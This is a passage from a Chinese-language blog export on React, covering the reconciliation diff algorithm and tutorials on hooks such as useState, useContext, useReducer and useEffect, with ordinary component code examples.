</ol>
<h2 id="4-Reconciliation-工作流程"><a href="#4-Reconciliation-工作流程" class="headerlink" title="4. Reconciliation 工作流程"></a>4. Reconciliation 工作流程</h2><p>前面也提到了 Reconciliation 主要有两个作用：<strong>找出两棵 react element tree</strong> 的差异、<strong>将差异更新到真实 DOM</strong> 。</p>
<h3 id="4-1-找出两棵-VDOM-树的差异"><a href="#4-1-找出两棵-VDOM-树的差异" class="headerlink" title="4.1 找出两棵 VDOM 树的差异"></a>4.1 找出两棵 VDOM 树的差异</h3><h4 id="4-1-1-三大策略"><a href="#4-1-1-三大策略" class="headerlink" title="4.1.1 三大策略"></a>4.1.1 三大策略</h4><p>在对比两棵 VDOM 树的差异上，React 制定了三个策略：</p>
<ol>
<li><p><strong>只对同级的 react element 进行对比</strong>，如果一个 DOM 节点在新旧两棵树上处于不同的层级，那么 React 不会尝试复用它</p>
</li>
<li><p><strong>两个不同类型的 DOM 节点（即 type 字段不同），React 也不会尝试复用它</strong>，而是会销毁旧有类型的 DOM 节点及其子孙节点，并新建最新类型的 DOM 节点及其子孙节点</p>
</li>
<li><p><strong>通过 <code>key</code> 属性来判断哪些同级多个元素在渲染更新后能保持稳定</strong>。示例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 更新前</span></span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;p key=<span class="string">&quot;qianduan&quot;</span>&gt;前端&lt;/p&gt;</span><br><span class="line">	&lt;h3 key=<span class="string">&quot;nodejs&quot;</span>&gt;NodeJS&lt;/h3&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新后</span></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;h3 key=<span class="string">&quot;nodejs&quot;</span>&gt;NodeJS&lt;/h3&gt;</span><br><span class="line">		&lt;p key=<span class="string">&quot;qianduan&quot;</span>&gt;前端&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>如果没有 key 属性，React 会认为 节点类型变更，因此会销毁并重建新类型的节点。</p>
<p>但是如果加上 key 属性，React 则可以通过 key 属性判断对应节点是否存在，从而可以复用相应节点，在上面的示例中，两个节点都可以复用，只需要互换下位置即可。</p>
</li>
</ol>
<h4 id="4-1-2-Diff-具体过程"><a href="#4-1-2-Diff-具体过程" class="headerlink" title="4.1.2 Diff 具体过程"></a>4.1.2 Diff 具体过程</h4><p>在对比同级节点时，有以下两种情况：</p>
<ol>
<li>同级只有一个节点</li>
<li>同级有多个节点</li>
</ol>
<p><strong>同级只有一个节点：</strong></p>
<p>对比新旧两节点的类型，</p>
<ol>
<li>若类型 type 和 key （若无 key，则看 index）相同，则复用该节点，然后仅对比并更新有改变的属性。</li>
<li>若类型 type 和 key （若无 key，则看 index）有一个不相同，则会销毁原来的节点及其子孙节点，并重建一个新的节点及其子孙节点。</li>
</ol>
<p><strong>同级有多个节点：</strong></p>
<p>当同级有多个节点时，需要处理以下3种情况：</p>
<ol>
<li>节点更新（类型和属性更新）</li>
<li>节点新增和删除</li>
<li>节点位置移动</li>
</ol>
<p>对于同级多个节点的 Diff，一定属于以上三种情况。同时，React 官方团队发现，在日常开发中，相对于增加、删除和位置移动，更新组件发生的频率更高，所以 React 的 Diff 算法会有闲判断并处理节点的更新。</p>
<p>对于同级的多个节点，我们可以将其看作是一个链表（原因是：同级的 react element 的 fiber node 会通过 sibling 字段链接成一个单向链表）。Diff 算法将会对同级节点链表进行2次遍历：</p>
<ol>
<li>第一轮遍历：完成节点更新（即节点对应的 DOM 可以复用，只需要更新一些属性）</li>
<li>第二轮遍历：对节点进行新增、删除和移动操作</li>
</ol>
<p><strong>第一轮遍历</strong></p>
<ol>
<li>遍历旧虚拟 DOM （react element tree）同级节点链表和新虚拟 DOM 同级链表，从第一个节点开始遍历，判断新、旧节点的类型（type）和 key 是否相同，如果 type 和 key 都相同，则说明对应的 DOM 节点可以复用</li>
<li>如果这个节点对应的 DOM 可以复用，则移动到下一组新旧节点，并判断它们的 type 和 key 是否相同，如果相同则表示对应的 DOM 可以复用，继续重复此步骤2，否则进入步骤3或4.</li>
<li>如果判断此组新旧节点对应的 DOM 不可以复用，则结束第一轮遍历</li>
<li>如果新同级节点链表遍历完成，或者旧同级节点链表遍历完成，则也结束遍历</li>
</ol>
<p>第一轮遍历结束之后，有<strong>两种可能的情况：</strong></p>
<ol>
<li><strong>在步骤三结束：</strong>此时新旧同级节点链表都没有遍历完成</li>
<li><strong>在步骤四结束：</strong>此时新旧节点链表中有一个没有遍历完成<ul>
<li>2.1 如果是新节点链表没有遍历完成，则说明需要新增节点，因此即将要新增的节点会被打上一个<code>Placement</code>的标签（即<code>newFiber.flags = Placement</code>）</li>
<li>2.2 如果是旧同级节点链表没有遍历完成，则说明需要删除节点，因此即将要删除的节点会被打上<code>Deletion</code>的标签（即<code>returnFiber.flags |= Deletion</code>）</li>
<li>2.3 新旧同级节点链表都遍历完了</li>
</ul>
</li>
</ol>
<p><strong>第二轮遍历</strong></p>
<p>如果是第一种结果：</p>
<p>说明新旧同级节点链表都没有遍历完，这意味着有的节点在这次更新中可能出现位置变动、删除、或者出现新增的节点。首先判断是否是节点位置移动，在遍历新同级节点链表时，为了能够快速在旧同级节点链表中找到对应的旧节点，React 会将旧同级节点链表中还没被处理过的节点以 map 的形式存放起来，将其的 <code>key</code> 作为 map 的 key，<code>fiber node</code> 作为对应的 value，这个 map 就是 <code>existingChildren</code></p>
<p><em><strong>步骤一：</strong></em></p>
<p><code>existingChildren</code> 的作用是：在第二轮遍历中，<strong>帮助快速查找旧同级节点链表中是否存在具有相同 key 和 type 的旧同级节点，从而判断该节点对应的 DOM 是否可以复用</strong></p>
<ol>
<li><p>如果遍历到的新同级节点 A 的 key 在 <code>existingChildren</code> 中，则表明旧同级节点链表中存在一个相同 key 的旧同级节点 A1，接着继续判断它们的 type 是否相同：</p>
<ul>
<li>如果 type 也相同，则说明该节点对应的 DOM 节点可以复用，只是位置发生了改变</li>
<li>如果 type 不同，则说明该节点对应的 DOM 不可复用，需要删除原来的节点并重新创建插入一个新的节点</li>
</ul>
</li>
<li><p>如果遍历到的新同级节点 A 的 key 不在 <code>existingChildren</code> 中，则表明在旧同级节点链表中找不到和 A 的 key 相同的旧同级节点 A1，那么说明 A 是一个新增的节点</p>
</li>
</ol>
<p><em><strong>步骤二：</strong></em></p>
<p>在判断出是要移动旧节点还是要删除原节点并新增新节点之后，需要进行具体的操作，即如何实现移动和删除新增，删除和新增比较简单，下面具体解释一下如何处理节点的位置变化。</p>
<p>处理节点位置变化主要有两点：</p>
<ol>
<li><strong>哪个节点需要右移？</strong></li>
<li><strong>向右移动到哪个位置？</strong></li>
</ol>
<p>要想明确上面这两点，首先需要找到一个<strong>参考点</strong>（即在其左边需要右移，在其右边则不需要）。React 使用 <code>lastPlacedIndex</code> 这个变量来存放参考点，<code>lastPlacedIndex</code> 表示当前最后一个可复用的节点，对应在旧同级节点链表中的索引，初始值为0。</p>
<p>在遍历剩下的新同级节点链表时，每一个新节点会通过 <code>existingChildren</code> 找到对应的旧节点（如有的话），然后就可以得到旧节点的索引 <code>oldIndex</code>。接下来会和 <code>lastPlacedIndex</code> 做比较并进行判断：</p>
<ul>
<li>如果 <code>oldIndex &gt;= lastPlacedIndex</code>，那么就表示该复用节点不需要移动位置，同时将 <code>lastPlacedIndex</code> 的值更新为 <code>oldIndex</code>。</li>
<li>如果 <code>oldIndex &lt; lastPlacedIndex</code>，那么就表示该复用节点需要向右移动，同时将该节点移动到上一个遍历到的新节点的后面（注：此时不需要更新 <code>lastPlacedIndex</code>）</li>
</ul>
<p><em><strong>步骤三：</strong></em></p>
<p>当第二轮遍历结束时，React 就知道要从旧同级节点链表变成新同级节点链表需要进行哪些节点的哪些操作。这些操作（work）即移动、删除、新增，会存放到各节点对应的 fiber node 中。在渲染阶段（Render phase），React 会读取并执行这些操作，从而完成 DOM 节点的更新。</p>
<h3 id="4-2-将差异更新到真实-DOM，完成-UI-的更新"><a href="#4-2-将差异更新到真实-DOM，完成-UI-的更新" class="headerlink" title="4.2 将差异更新到真实 DOM，完成 UI 的更新"></a>4.2 将差异更新到真实 DOM，完成 UI 的更新</h3><p>经过上面的 Diff 之后，每个 react element 自身的更新任务（work）都存放在其对应的 fiber node 中。</p>
<p>在渲染阶段，Reconciliation 会从 fiber node tree 最顶端的节点开始，重新对整棵 fiber node tree 进行<strong>深度优先遍历</strong>，处理树中的每一个 fiber node，处理 fiber node 中存储的 work。其中，<strong>遍历一次 fiber node tree 并执行其中的 work 的过程称为一次 work loop</strong>。</p>
<p><strong>注：React 开发者做了一个优化，即 Effect List。</strong>React 会跳过那些已经处理过的 fiber node，只会去处理那些未完成 work 的 fiber node。例如，如果在组件树的深层中更新了某个 state，那么虽然 React 还是会从 fiber node tree 的顶部的节点开始遍历，但它会跳过前面的父节点，直接走到发生 state 变更的子节点。</p>
<p>当 work loop 结束之后（即遍历完整棵 fiber node tree之后），就会进入 commit 阶段（Commit Phase）。在 commit 阶段，React 会去更新真实 DOM 树，从而完成 UI 的更新渲染。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考自掘金文章——<a href="https://juejin.cn/post/6891242214324699143">轻烤 React 核心机制：React Fiber 与 Reconciliation</a></p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>再探 React Hooks</title>
    <url>/2022/02/21/ReactHookIntro2/</url>
    <content><![CDATA[<p><strong>在之前的一章我们已经了解了 React Hook 的一些基本特性/优点和一些使用方法。在这一章中，我们将深入介绍另外几个常用的钩子。</strong></p>
<a id="more"></a>

<h1 id="React-Hooks-Intro"><a href="#React-Hooks-Intro" class="headerlink" title="React Hooks Intro"></a>React Hooks Intro</h1><h2 id="一、类与函数的区别"><a href="#一、类与函数的区别" class="headerlink" title="一、类与函数的区别"></a>一、类与函数的区别</h2><p>React的核心是<strong>组件</strong>。在v16.8版本之前，组件的标准写法是类组件。</p>
<h3 id="1-1-类组件的缺点"><a href="#1-1-类组件的缺点" class="headerlink" title="1.1 类组件的缺点"></a>1.1 类组件的缺点</h3><ul>
<li>组件类代码很“重”</li>
<li>真实的 React App 由多个类按层级，一层层构成，复杂度很高</li>
<li>如果再使用 Redux，整个项目看起来会变得非常复杂</li>
</ul>
<p>根据 Redux 的作者 Dan 的总结，组件类有以下几个缺点：</p>
<ul>
<li><strong>Huge components</strong> that are hard to refactor and test.</li>
<li><strong>Duplicated logic</strong> between different components and lifecycle methods.</li>
<li><strong>Complex patterns</strong> like render props and higher-order components.</li>
</ul>
<p>翻译一下就是：</p>
<ul>
<li><strong>大型组件</strong>很难拆分、重构和测试</li>
<li>业务逻辑存在于不同组件以及生命周期方法中，因此会导致<strong>重复逻辑</strong></li>
<li><strong>复杂的编程模式</strong>，如render props 和高阶组件</li>
</ul>
<h3 id="1-2-函数组件的优势"><a href="#1-2-函数组件的优势" class="headerlink" title="1.2 函数组件的优势"></a>1.2 函数组件的优势</h3><p>React 官方希望组件是一个简单的<strong>数据流管道</strong>，让开发者可以根据需求来组合管道，而不要变成一个复杂的容器。因此组件的最佳写法是函数式。</p>
<p>早期的函数组件无法取代类组件，是因为函数组件必须是<strong>纯函数</strong>，因此<strong>不能包含状态</strong>和<strong>生命周期方法</strong>。</p>
<p>而 React Hook 的出现彻底解决了这个问题，它可以让我们用函数式组件的写法，完成一个功能齐全的组件。</p>
<h2 id="二、What-is-Hook"><a href="#二、What-is-Hook" class="headerlink" title="二、What is Hook?"></a>二、What is Hook?</h2><p><strong>React Hooks</strong> 是为函数组件提供所需要的<strong>外部功能</strong>和<strong>副作用</strong>的“钩子”。</p>
<p>因此我们需要什么功能，就使用什么钩子。</p>
<p>要注意的是，如果我们自己封装自定义的钩子，需要遵循命名规则，即钩子一律使用 use 前缀来命名，以便于识别。</p>
<p>接下来，我们来介绍几个 React 提供的常用的钩子。</p>
<blockquote>
<ul>
<li>useState()</li>
<li>useContext()</li>
<li>useReducer()</li>
<li>useEffect()</li>
</ul>
</blockquote>
<h2 id="三、useState-状态钩子"><a href="#三、useState-状态钩子" class="headerlink" title="三、useState(): 状态钩子"></a>三、useState(): 状态钩子</h2><p>由于纯函数不能有状态，所以需要把状态放在钩子里面。</p>
<p>useState() 函数接受状态的初始值作为参数，并返回一个数组，数组的第一个值为表示当前状态值的变量，第二个值为用来更新状态的函数（命名约定为：以<code>set</code>前缀+状态的变量名）。示例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Button</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [buttonText, setButtonText] = useState(<span class="string">&#x27;Hello!&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> handleClick = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    setButtonText(<span class="string">&#x27;World!&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;button onClick=&#123;handleClick&#125;&gt;&#123;buttonText&#125;&lt;/button&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="四、useContext-共享状态钩子"><a href="#四、useContext-共享状态钩子" class="headerlink" title="四、useContext(): 共享状态钩子"></a>四、useContext(): 共享状态钩子</h2><p>如果需要在组件间共享状态，可以使用<code>useContext()</code>。</p>
<p>例如组件A和组件B需要共享状态，示例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// App.jsx</span></span><br><span class="line"><span class="keyword">const</span> AppContext = React.createContext(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">&lt;AppContext.Provider value = &#123;&#123;<span class="attr">username</span>: <span class="string">&#x27;Will&#x27;</span>&#125;&#125;&gt;</span><br><span class="line">  &lt;div className=<span class="string">&#x27;App&#x27;</span>&gt;</span><br><span class="line">    &lt;A /&gt;</span><br><span class="line">    &lt;B /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/AppContext.Provider&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A.jsx</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username &#125; = useContext(AppContext);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=<span class="string">&#x27;A&#x27;</span>&gt;</span><br><span class="line">      &lt;p&gt;Home&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;&#123;username&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// B.jsx</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username &#125; = useContext(AppContext);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=<span class="string">&#x27;B&#x27;</span>&gt;</span><br><span class="line">      &lt;h1&gt;B Component&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;the current user is: &#123;username&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="五、useReducer-action-钩子"><a href="#五、useReducer-action-钩子" class="headerlink" title="五、useReducer(): action 钩子"></a>五、useReducer(): action 钩子</h2><p>React 本身并不提供状态管理工具，如果需要，通常是引入外部库，当前最流行的库非 Redux 莫属。</p>
<p><strong>Redux 的核心理念</strong>是：组件<strong>发出 action 与状态管理器通信</strong>，在状态管理器收到 action 后，<strong>使用 Reducer 函数计算出最新的状态</strong>并返回其值（Reducer函数形式大致为：<code>(state, action) =&gt; newState</code>）。（具体关于 Redux 的介绍，请参考我之前的关于 Redux 的文章）</p>
<p>随着 Redux 的流行，React 官方也加入了 <code>useReducers()</code> 这个钩子用来引入 Reducer 功能，从而可以更方便的使用 Redux。</p>
<p>**useReducer()**的基本用法：接受 Reducer 函数和状态初始值作为参数，并返回一个数组。数组的第一个值是当前状态值，第二个值是用来发送 action 的 dispatch 函数。</p>
<p>以计数器为例，示例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 reducer 函数</span></span><br><span class="line"><span class="keyword">const</span> myReducer = <span class="function">(<span class="params">state, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span>(action.type) &#123;</span><br><span class="line">      <span class="keyword">case</span>(<span class="string">&#x27;countUp&#x27;</span>):</span><br><span class="line">      	<span class="keyword">return</span> &#123;</span><br><span class="line">          ...state,</span><br><span class="line">          count: state.count + <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">case</span> (<span class="string">&#x27;countDown&#x27;</span>):</span><br><span class="line">      	<span class="keyword">return</span> &#123;</span><br><span class="line">          ...state,</span><br><span class="line">          count: state.count - <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算器组件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [state, dispatch] = useReducer(myReducer, &#123; <span class="attr">count</span>: <span class="number">0</span> &#125;)</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=<span class="string">&#x27;App&#x27;</span>&gt;</span><br><span class="line">      &lt;button onClick=&#123;<span class="function">() =&gt;</span> dispatch(&#123;<span class="attr">type</span>: <span class="string">&#x27;countUp&#x27;</span>&#125;)&#125;&gt;+<span class="number">1</span>&lt;/button&gt;</span><br><span class="line">      &lt;button onClick=&#123;<span class="function">() =&gt;</span> dispatch(&#123;<span class="attr">type</span>: <span class="string">&#x27;countDown&#x27;</span>&#125;)&#125;&gt;-<span class="number">1</span>&lt;/button&gt;</span><br><span class="line">      &lt;p&gt;Count: &#123;state.count&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尽管使用 Hook <strong>可以提供共享状态</strong>以及<strong>Reducer 函数</strong>，但是由于 React 本身并<strong>没有提供中间件（middleware）</strong>以及<strong>时间旅行（time travel）</strong>，因此，如果需要使用这两个功能，还是要用 Redux。</p>
<h2 id="六、useEffect-通用副作用钩子"><a href="#六、useEffect-通用副作用钩子" class="headerlink" title="六、useEffect(): 通用副作用钩子"></a>六、useEffect(): 通用副作用钩子</h2><p>这个在上一章中已经详细讲解，这里不多赘述。只给出一个简单示例，如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Person 组件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">&#123; personId &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = useState(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> [person, setPerson] = useState(&#123;&#125;);</span><br><span class="line">  </span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    setLoading(<span class="literal">true</span>);</span><br><span class="line">    fetch(<span class="string">`https://getApi/<span class="subst">$&#123;personId&#125;</span>`</span>)</span><br><span class="line">    	.then(<span class="function"><span class="params">response</span> =&gt;</span> response.json())</span><br><span class="line">    	.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      	setPerson(data);</span><br><span class="line">      	setLoading(<span class="literal">false</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;, [personId])</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (loading === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Loading...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;Name: &#123;person.name&#125;&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;Age: &#123;person.age&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="七、创建自定义的-Hook"><a href="#七、创建自定义的-Hook" class="headerlink" title="七、创建自定义的 Hook"></a>七、创建自定义的 Hook</h2><p>如上面代码示例所示，我们也可以将其封装起来以变成一个自定义的 Hook。</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 封装为 Hook</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">usePerson</span>(<span class="params">personId</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = useState(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> [person, setPerson] = useState(&#123;&#125;);</span><br><span class="line">  </span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    setLoading(<span class="literal">true</span>);</span><br><span class="line">    fetch(<span class="string">`https://getApi/<span class="subst">$&#123;personId&#125;</span>`</span>)</span><br><span class="line">    	.then(<span class="function"><span class="params">response</span> =&gt;</span> response.json())</span><br><span class="line">    	.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      	setPerson(data);</span><br><span class="line">      	setLoading(<span class="literal">true</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, [personId])</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> [loading, person];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Person 组件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">&#123; personId &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [loading, person] = usePerson(personId);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (loading === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Loading...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;Name: &#123;person.name&#125;&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;Age: &#123;person.age&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>Notes：</strong>以上内容借鉴了阮一峰老师的文章。</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>初识 React Hook</title>
    <url>/2022/02/12/ReactHookIntroduction/</url>
    <content><![CDATA[<p>在Facebook以及社区成员的大力推广下，如今React已经几乎成为前端开发的必备技能。但随着对版本的不断优化和迭代，React官方决定<strong>逐步废弃 Class Component 的API</strong>，<strong>全面拥抱 Function Component 的API 即基于函数的钩子 Hook</strong> 。这一趋势也是在意料之中，React建立之初本就是面向函数式的，之后加入的类组件API颇有些“强扭瓜不甜”的味道。本次，我们将初步了解一下 React Hook 的用法。</p>
<a id="more"></a>

<h1 id="React-Hook"><a href="#React-Hook" class="headerlink" title="React Hook"></a>React Hook</h1><h2 id="一、关于React的两套API"><a href="#一、关于React的两套API" class="headerlink" title="一、关于React的两套API"></a>一、关于React的两套API</h2><p>很久以前，React大多数情况下都是使用一套API 即类组件API，然而随着React引入了全新的基于函数的钩子 Hook，函数式组件的使用变得更加广泛。</p>
<p>因此，现在任何一个组件既可以用类来写，又可以用钩子即函数来写。</p>
<p>示例代码如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class component</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function component</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Welcome</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正如前文所说，尽管两者都可以使用，但是现在官方推荐使用钩子（函数）。</p>
<p>使用函数式的写法即钩子有很多好处：</p>
<ol>
<li><p>视觉上：钩子更简洁，代码量更少</p>
<p>原因：钩子 Hooks可以更优雅地实现逻辑复用。开发人员可以把逻辑抽象成钩子 Hooks 以实现代码复用，进一步，更可以将其发布为Library，供React生态社区的其他人使用。</p>
<p>再比如：钩子 Hooks (主要为useEffect) 充当了函数式组件中的“生命周期”的概念，这也大大减少了API</p>
</li>
<li><p>使用上：钩子更灵活，用起来更“轻”，类组件则相对更“重”</p>
</li>
<li><p>🌈屁：更符合React函数式的本质</p>
</li>
</ol>
<h2 id="二、二者差异"><a href="#二、二者差异" class="headerlink" title="二、二者差异"></a>二、二者差异</h2><h3 id="1-Class-Component"><a href="#1-Class-Component" class="headerlink" title="1. Class Component"></a>1. Class Component</h3><p>类组件是<strong>数据和逻辑的封装</strong>。组件的状态和操作方法是封装在一起的。因此在类组件的写法中，相关的数据和操作方法一般需要写在同一个 class 中。</p>
<h3 id="2-Function-Component"><a href="#2-Function-Component" class="headerlink" title="2. Function Component"></a>2. Function Component</h3><p>函数组件是<strong>只聚焦于一件事，即返回一个值</strong>。如果有多个操作，每个操作应该单独写成一个函数。并且，<strong>数据的状态应该与操作方法分离</strong>。因此，在React中的函数组件应该只专注于一件事即：<strong>返回组件的HTML代码</strong>。这种根据输入的数据，只进行单纯的数据计算的函数，称为<strong>“纯函数”</strong>（在函数式编程中）。</p>
<p><strong>Notes：</strong>以上参考了阮一峰老师的Blog。</p>
<h2 id="三、副效应"><a href="#三、副效应" class="headerlink" title="三、副效应"></a>三、副效应</h2><p>首先考虑一个问题，函数式组件是纯函数，因此只能进行数据计算，那么<strong>诸如生成日志、存储数据、改变应用状态等等不涉及计算的操作</strong>就无法被函数组件直接包含，我们把它们称为<strong>副效应（side effect）</strong>。因为如果函数内部直接包含副效应，它便不再是纯函数了，所以在函数组件内部，我们<strong>通过间接的方法来包含副效应</strong>。</p>
<h2 id="四、钩子-Hook"><a href="#四、钩子-Hook" class="headerlink" title="四、钩子 Hook"></a>四、钩子 Hook</h2><p>简言之：<strong>钩子（hook）是React函数组件的副效应的解决方案，用来为函数组件引入副效应。</strong></p>
<p>函数组件只用来返回组件的HTML代码，所有的副效应都通过钩子来引入。</p>
<p>由于副效应很多，所以相应的钩子也有很多。React为一些常见的副效应提供了专用的钩子。</p>
<ul>
<li><strong>useState(): 保存状态</strong></li>
<li><strong>useContext(): 保存上下文</strong></li>
<li><strong>useRef(): 保存引用</strong></li>
<li>…</li>
</ul>
<p>以上的这些钩子都是引入某种特定的副效应，而 <strong>useEffect()</strong> 是<strong>通用的副效应钩子</strong>。在找不到对应的钩子时，可以使用它。</p>
<h2 id="五、useEffect-的用法"><a href="#五、useEffect-的用法" class="headerlink" title="五、useEffect() 的用法"></a>五、useEffect() 的用法</h2><h3 id="1-基本用法——第一个参数"><a href="#1-基本用法——第一个参数" class="headerlink" title="1. 基本用法——第一个参数"></a>1. 基本用法——第一个参数</h3><p>useEffect() 本身是一个函数，由React提供，在函数组件内部调用即可。</p>
<p>useEffect() 的第一个参数是一个函数，它就是副效应。<strong>组件的首次加载到DOM以及以后组件的每次渲染，React都会自动执行该函数。</strong></p>
<p>例如，我们希望组件加载以后，网页标题（document.title）会随之改变。那么，改变标题这个操作就是组件的副效应，可以通过 useEffect() 来实现。</p>
